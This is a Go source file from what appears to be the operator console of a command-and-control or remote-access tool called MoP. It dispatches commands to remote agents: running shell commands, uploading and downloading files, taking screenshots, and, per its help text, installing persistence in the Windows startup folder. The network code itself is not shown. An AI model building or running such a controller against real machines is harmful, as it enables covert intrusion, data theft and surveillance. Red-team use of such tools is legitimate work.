package commands

import (
	"MoP/src/controllers"
	"MoP/src/messages"
	"fmt"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

func ShowHandler(command []string, agent string) {
	if len(command) > 1 {
		switch command[1] {
		// executa a captura de agentes do pacote controllers
		case "agents":
			controllers.GetAgents()
		case "history":
			if agent != "" {
				controllers.GetHistory(agent, command)
			}
		default:
			fmt.Println()
			fmt.Printf("The parameter %s doesn't exists!\n", command[1])
			fmt.Println()
		}
	} else {
		fmt.Println()
		fmt.Println("To list the agents, use: show agents")
		fmt.Println()
	}
}

func SetAlias(command []string, agent string) {
	if len(command) > 1 {
		agentID, _ := strconv.Atoi(agent)
		resp := controllers.ChangeAlias(agentID, command[1])
		fmt.Println(resp)
	} else {
		fmt.Println()
		fmt.Println("You need to inform an alias!")
		fmt.Println()
	}
}

func SelectHandler(command []string) string {
	if len(command) > 1 {
		agentID, _ := strconv.Atoi(command[1])
		// valida se o agente existe com o pacote controllers
		if controllers.CheckAgents(uint64(agentID)) {
			selectedAgent := command[1]
			return selectedAgent
		} else {
			fmt.Println("\nThe selected agent doesn't exists!")
			fmt.Println("To list the agents, use: show agents")
			fmt.Println()
			return ""
		}

	} else {
		return ""
	}
}

func CommandHandler(agent string, command string) {
	command = strings.TrimSuffix(command, "\n")
	if len(command) > 0 {
		agentID, _ := strconv.Atoi(agent)
		controllers.SendCommand(uint64(agentID), command)
	}
}

func UploadFile(agent string, command []string) {
	if len(command) > 1 {
		agentID, _ := strconv.Atoi(agent)
		fileName := filepath.Base(command[1])
		err := controllers.SendFile(uint64(agentID), command[1], fileName)
		if err != nil {
			fmt.Println()
			
			fmt.Println()
		}
	} else {
		fmt.Println()
		fmt.Println("You need to inform the path of the file!")
		fmt.Println()
	}
}

func DownloadFile(agent string, command []string) {
	if len(command) > 1 {
		agentID, _ := strconv.Atoi(agent)
		fileName := filepath.Base(command[1])
		err := controllers.ReqFile(uint64(agentID), command[1], fileName, "download")
		if err != nil {
			fmt.Println()
			messages.ErrorMessage("download the file", err)
			fmt.Println()
		}

	} else {
		fmt.Println()
		fmt.Println("You need to inform the path of the file!")
		fmt.Println()
	}
}

func TakeScrenshot(agent string, command []string) {
	agentID, _ := strconv.Atoi(agent)
	ct := time.Now()
	fileName := "./ss-" + ct.Format("2006-01-02-15-04-05") + ".png"
	err := controllers.ReqFile(uint64(agentID), "screenshot", fileName, "screenshot")
	if err != nil {
		fmt.Println()
		fmt.Println("Error to take screenshot the file: ", err)
		fmt.Println()
	}
}

func Help() string {
	help := `
	SERVER COMMANDS:

		!<command>: run SO command on server machine.

		alias <alias>: set an alias to an agent when one that agent is selected.

		help: show this help.
	
		show agents: list the active agents to interact.
			
		select <id>: select an agent by id to interact.


	AGENT COMMANDS:

		download <filepath>: download a file from agent machine.

		persist: make a copy of the agent to startup directory on Windows machines.

		ps: shows the process list running on agent machine.

		screenshot: take a screenshot from agent machine.

		show history: list the command history when one agent is selected.

		sleep <time seconds>: change the sleep time before send response to server (default 10).

		upload <file path>: send a file to agent machine.
		
		`
	return help

}
